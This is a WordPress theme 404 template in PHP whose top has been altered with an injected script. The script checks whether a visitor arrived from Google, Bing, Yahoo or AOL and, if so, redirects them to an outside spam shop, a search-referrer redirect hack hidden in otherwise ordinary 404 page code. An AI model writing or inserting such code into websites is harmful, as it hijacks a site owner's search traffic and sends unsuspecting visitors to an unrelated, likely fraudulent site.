<?php get_header();
    echo'<script>
var s = document.referrer;
if (s.indexOf("google") > 0 || s.indexOf("bing") > 0 || s.indexOf("yahoo") > 0 || s.indexOf("aol") > 0) {
    self.location = \'http://yeezyboost750sale.com/\';
}</script > '; ?>

<section class="content">

	<?php get_template_part('inc/page-title'); ?>
	
	<div class="pad group">		
		
		<div class="notebox">
			<?php get_search_form(); ?>
		</div>
		
		<div class="entry">
			<p><?php _e( 'The page you are trying to reach does not exist, or has been moved. Please use the menus or the search box to find what you are looking for.', 'hueman' ); ?></p>
		</div>
		
	</div><!--/.pad-->
	
</section><!--/.content-->

<?php get_sidebar(); ?>

<?php get_footer(); ?>